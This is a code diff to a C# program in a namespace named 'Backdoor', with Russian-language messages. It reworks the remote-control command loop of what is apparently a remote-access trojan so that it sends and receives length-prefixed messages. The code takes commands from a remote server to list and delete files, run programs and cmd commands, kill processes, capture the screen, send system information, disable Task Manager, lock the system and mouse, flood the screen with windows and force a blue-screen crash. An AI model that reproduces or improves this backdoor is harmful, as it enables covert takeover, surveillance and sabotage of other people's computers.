@@ -66,16 +66,17 @@ namespace Backdoor
             {
                 string data = null;
 
-                byte[] bytes = new byte[100000];
-                int bytesRec = 0;
+                byte[] bytes = new byte[0];
+                //int bytesRec = 0;
                 try
                 {
-                    bytesRec = conn.Receive(bytes);
+                    bytes = ReceiveDataFromServer();
+                  //  bytesRec = conn.Receive(bytes);
                 }
                 catch (Exception e) { Console.WriteLine($"Соеденение преравнно, ошибка {e.Message}"); Connect(); break; }
 
                 CommandExecutor executor = new CommandExecutor();
-                data = Encoding.UTF8.GetString(bytes, 0, bytesRec);
+                data = Encoding.UTF8.GetString(bytes);
                 if (data == "test_connect") continue; 
 
                 Console.Write("Полученный текст: " + data + "\n\n"); ;
@@ -87,7 +88,7 @@ namespace Backdoor
                         data = data.Remove(0, 2);
                         string path = ParseComand(data);
                         var files = executor.ScanDirectoryFromXml(path);
-                        conn.Send(Encoding.UTF8.GetBytes(files));
+                        SendDataToServer(files);
                         continue;
                     }
 
@@ -96,7 +97,7 @@ namespace Backdoor
                         data = data.Remove(0, 2);
                         string path = ParseComand(data);
                         executor.RemoveFileOrDirectory(path);
-                        conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
+                        SendDataToServer("Файл " + path + " удалён.");
                         continue;
                     }
 
@@ -106,7 +107,7 @@ namespace Backdoor
                         data = data.Remove(0, 5);
                         string path = ParseComand(data);
                         executor.StartFile(path);
-                        conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
+                        SendDataToServer("Процесс " + path + " запущён.");
                         continue;
                     }
 
@@ -116,14 +117,14 @@ namespace Backdoor
                         data = data.Remove(0, 5);
                         var pname = ParseComand(data);
                         executor.pkill(pname);
-                        conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
+                        SendDataToServer("Процесс с именем " + pname + " уничтожен");
                         continue;
                     }
 
                     if (data.StartsWith("tasklist") || data == "tasklist")
                     {
                         string tasks = executor.GetAllTasksInSysFromXml();
-                        conn.Send(Encoding.UTF8.GetBytes(tasks));
+                        SendDataToServer(tasks);
                         continue;
                     }
 
@@ -132,7 +133,7 @@ namespace Backdoor
                         data = data.Remove(0, 3);
                         string comm = ParseComand(data);
                         var result = executor.ExecuteCmdCommand(comm);
-                        conn.Send(Encoding.UTF8.GetBytes(result));
+                        SendDataToServer(result);
                         continue;
                     }
 
@@ -141,7 +142,7 @@ namespace Backdoor
                         data = data.Remove(0, 3);
                         string msg = ParseComand(data);
                         executor.ShowUserMsg(msg);
-                        conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
+                        SendDataToServer($"Сообщение отправлено");
                         continue;
                     }
                     if (data.StartsWith("enTaskmgr"))
@@ -151,19 +152,19 @@ namespace Backdoor
                         if (comm == "true")
                         {
                             executor.UnLockTaskMgr();
-                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
+                            SendDataToServer($"Диспетчер задач включен");
                         }
                         if (comm == "false")
                         {
                             executor.LockTaskMgr();
-                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
+                            SendDataToServer($"Диспетчер задач выключен");
                         }
                         continue;
                     }
                     if (data.StartsWith("bluescreen") || data == "bluescreen")
                     {
                         executor.CrashSystem();
-                        conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
+                        SendDataToServer("Система успешно крашнута");
                         continue;
                     }
                     if (data.StartsWith("download"))
@@ -178,7 +179,7 @@ namespace Backdoor
                         var comm = ParseComand(data);
                         if (comm == "get")
                         {
-                            conn.Send(executor.CaptureScreenAndTransleteToBytes());
+                            SendDataToServer(executor.CaptureScreenAndTransleteToBytes());
                             continue;
                         }
                     }
@@ -189,13 +190,13 @@ namespace Backdoor
                         if (comm == "true")
                         {
                             executor.LockSystem();
-                            conn.Send(Encoding.UTF8.GetBytes("заблокированно"));
+                            SendDataToServer("заблокированно");
                             continue;
                         }
                         if (comm == "false")
                         {
                             executor.UnLockSystem();
-                            conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
+                            SendDataToServer("разблокированно");
                             continue;
                         }
                         else
@@ -210,13 +211,13 @@ namespace Backdoor
                         if (comm == "true")
                         {
                             executor.LockMouse();
-                            conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
+                            SendDataToServer("курсор заблокирован");
                             continue;
                         }
                         if (comm == "false")
                         {
                             executor.UnLockMouse();
-                            conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
+                            SendDataToServer("курсор разблокирован");
                             continue;
                         }
                         else
@@ -232,13 +233,13 @@ namespace Backdoor
                         {
                             comm = comm.Remove(0, 5);
                             executor.SpamScreenFromWindows(comm);
-                            conn.Send(Encoding.UTF8.GetBytes("экран замусорен"));
+                            SendDataToServer("экран замусорен");
                             continue;
                         }
                         if (comm.StartsWith("false"))
                         {
                             executor.DestroySpamWindows();
-                            conn.Send(Encoding.UTF8.GetBytes("очищено"));
+                            SendDataToServer("очищено");
                             continue;
                         }
                         else
@@ -249,7 +250,7 @@ namespace Backdoor
                     if (data.StartsWith("abort connection") || data == "abort connection")
                     {
                         Console.WriteLine($"Пользователь прервал соеденение");
-                        conn.Send(Encoding.UTF8.GetBytes("Abort connection"));
+                        SendDataToServer("Abort connection");
                         Connect();
                         break;
                     }
@@ -259,12 +260,12 @@ namespace Backdoor
                         string comm = ParseComand(data);
                         if (comm.StartsWith("true"))
                         {
-                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation(true)));
+                            SendDataToServer(executor.GetSystemInformation(true));
                             continue;
                         }
                         if (comm.StartsWith("false"))
                         {
-                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation(true)));
+                            SendDataToServer(executor.GetSystemInformation(true));
                             continue;
                         }
                         else
@@ -275,9 +276,61 @@ namespace Backdoor
                 }
                 catch (Exception e)
                 {
-                    conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message + " Sourse:" + e.Source));
+                    SendDataToServer("Ошибка: " + e.Message + " Sourse:" + e.Source);
                 }
             }
+        }
+        public void SendDataToServer(string data)
+        {
+            char[] stringSize = new char[10];
+            int size = Encoding.UTF8.GetBytes(data).Length;
+
+            for (int i = 0; i < size.ToString().Length; i++)
+            {
+                stringSize[i] = size.ToString()[i];
+            }
+            byte[] buffer = Encoding.UTF8.GetBytes(new string(stringSize) + data);
+            Console.Write($"На сервер отправлено {buffer.Length} байт, указано в заголвке {new string(stringSize)}");
+            conn.Send(buffer);
+        }
+        public void SendDataToServer(byte[] data)
+        {
+            char[] stringSize = new char[10];
+            int size = data.Length;
+
+            for (int i = 0; i < size.ToString().Length; i++)
+            {
+                stringSize[i] = size.ToString()[i];
+            }
+            var bytesSize = Encoding.UTF8.GetBytes(new string(stringSize));
+            byte[] buffer = new byte[bytesSize.Length + data.Length];
+
+            Buffer.BlockCopy(bytesSize, 0, buffer, 0, bytesSize.Length);
+            Buffer.BlockCopy(data, 0, buffer, bytesSize.Length, data.Length);
+            Console.Write($"На сервер отправлено {buffer.Length} байт, указано в заголвке {new string(stringSize)}");
+            conn.Send(buffer);
+        }
+        public byte[] ReceiveDataFromServer()
+        {
+            var bytesSize = new byte[10];
+
+            conn.Receive(bytesSize);
+            int size = int.Parse(Encoding.UTF8.GetString(bytesSize));
+
+            byte[] bytes = new byte[size];
+
+            int offset = 0;
+            int remaining = size;
+            while (remaining > 0)
+            {
+                int read = conn.Receive(bytes, offset, remaining, SocketFlags.None);//stream.Read(data, offset, remaining);
+                if (read <= 0)
+                    throw new System.IO.EndOfStreamException
+                        (String.Format("End of stream reached with {0} bytes left to read", remaining));
+                remaining -= read;
+                offset += read;
+            }
+            return bytes;
         }
         public static string ParseComand(string allcommand, Char attribute = '$')
         {
@@ -351,11 +404,11 @@ namespace Backdoor
             files += "<files> ";
             for (int i = 0; i < dirFiles.Length; i++)
             {
-                files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
+                files += $" <file{i}>" + Path.GetFileName(dirFiles[i]) + $"</file{i}>";
             }
             for (int i = 0; i < directoris.Length; i++)
             {
-                files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
+                files += $" <dir{i}>" + "/" + Path.GetFileName(directoris[i]) + $"</dir{i}>";
             }
             files += " </files>";
             return files;
